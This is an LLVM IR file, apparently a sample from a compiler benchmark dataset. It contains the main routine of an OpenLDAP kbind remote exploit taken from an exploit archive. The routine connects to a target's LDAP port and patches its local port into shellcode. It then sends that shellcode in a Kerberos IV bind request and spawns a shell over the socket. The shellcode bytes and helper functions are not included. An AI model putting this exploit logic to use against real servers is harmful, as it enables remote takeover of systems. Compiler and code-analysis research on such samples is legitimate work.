; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_2933.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_2933.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SHELLCODE_LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [57 x i8] c": openldap-kbind-p00f.c - OpenLDAP kbind remote exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c": Only works on servers compiled with\0A\00", align 1
@.str.3 = private unnamed_addr constant [73 x i8] c"    --enable-kbind    enable LDAPv2+ Kerberos IV bind (deprecated) [no]\0A\00", align 1
@.str.4 = private unnamed_addr constant [49 x i8] c": by Solar Eclipse <solareclipse@phreedom.org>\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c": Usage: %s hostname bind_dn\0A\00", align 1
@.str.6 = private unnamed_addr constant [49 x i8] c"  The bind_dn must exist in the LDAP directory.\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@FINDSCKPORTOFS = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [19 x i8] c"Sending shellcode\0A\00", align 1
@LDAP_AUTH_KRBV41 = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [11 x i8] c"echo 'a';\0A\00", align 1
@.str.9 = private unnamed_addr constant [21 x i8] c"Reading bind result\0A\00", align 1
@.str.10 = private unnamed_addr constant [43 x i8] c"LDAP_AUTH_KRBV41 bind request returned %s\0A\00", align 1
@.str.11 = private unnamed_addr constant [19 x i8] c"Spawning shell...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @SHELLCODE_LEN, align 4
  %14 = add nsw i32 %13, 1
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %6, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %7, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.3, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.4, i64 0, i64 0))
  %24 = load i32, i32* %4, align 4
  %25 = icmp slt i32 %24, 3
  br i1 %25, label %26, label %33

26:                                               ; preds = %2
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0), i8* %29)
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.6, i64 0, i64 0))
  %32 = call i32 @exit(i32 1) #4
  unreachable

33:                                               ; preds = %2
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 2
  %36 = load i8*, i8** %35, align 8
  store i8* %36, i8** %11, align 8
  store i32 389, i32* %8, align 4
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %8, align 4
  %41 = call i32 @connect_host(i8* %39, i32 %40)
  store i32 %41, i32* %9, align 4
  %42 = load i32, i32* %9, align 4
  %43 = call i32 @get_local_port(i32 %42)
  store i32 %43, i32* %8, align 4
  %44 = load i32, i32* %8, align 4
  %45 = and i32 %44, 255
  %46 = trunc i32 %45 to i8
  %47 = load i8*, i8** @shellcode, align 8
  %48 = load i64, i64* @FINDSCKPORTOFS, align 8
  %49 = getelementptr inbounds i8, i8* %47, i64 %48
  store i8 %46, i8* %49, align 1
  %50 = load i32, i32* %8, align 4
  %51 = ashr i32 %50, 8
  %52 = and i32 %51, 255
  %53 = trunc i32 %52 to i8
  %54 = load i8*, i8** @shellcode, align 8
  %55 = load i64, i64* @FINDSCKPORTOFS, align 8
  %56 = add i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  store i8 %53, i8* %57, align 1
  %58 = load i32, i32* @SHELLCODE_LEN, align 4
  %59 = call i32 @build_shellcode(i8* %17, i32 %58)
  %60 = load i32, i32* @SHELLCODE_LEN, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %17, i64 %61
  store i8 0, i8* %62, align 1
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.7, i64 0, i64 0))
  %64 = load i32, i32* %9, align 4
  %65 = load i32, i32* @LDAP_AUTH_KRBV41, align 4
  %66 = load i8*, i8** %11, align 8
  %67 = call i32 @send_bind_request(i32 %64, i32 %65, i8* %66, i8* %17)
  %68 = call i32 @sleep(i32 2)
  %69 = load i32, i32* %9, align 4
  %70 = call i32 @write(i32 %69, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0), i32 10)
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0))
  %72 = load i32, i32* %9, align 4
  %73 = call i32 @read_bind_result(i32 %72)
  store i32 %73, i32* %10, align 4
  %74 = load i32, i32* %10, align 4
  %75 = icmp sgt i32 %74, 0
  br i1 %75, label %76, label %80

76:                                               ; preds = %33
  %77 = load i32, i32* %10, align 4
  %78 = call i8* @ldap_result(i32 %77)
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.10, i64 0, i64 0), i8* %78)
  br label %84

80:                                               ; preds = %33
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.11, i64 0, i64 0))
  %82 = load i32, i32* %9, align 4
  %83 = call i32 @sh(i32 %82)
  br label %84

84:                                               ; preds = %80, %76
  %85 = load i32, i32* %9, align 4
  %86 = call i32 @close(i32 %85)
  store i32 0, i32* %3, align 4
  %87 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %87)
  %88 = load i32, i32* %3, align 4
  ret i32 %88
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @connect_host(i8*, i32) #2

declare dso_local i32 @get_local_port(i32) #2

declare dso_local i32 @build_shellcode(i8*, i32) #2

declare dso_local i32 @send_bind_request(i32, i32, i8*, i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @read_bind_result(i32) #2

declare dso_local i8* @ldap_result(i32) #2

declare dso_local i32 @sh(i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
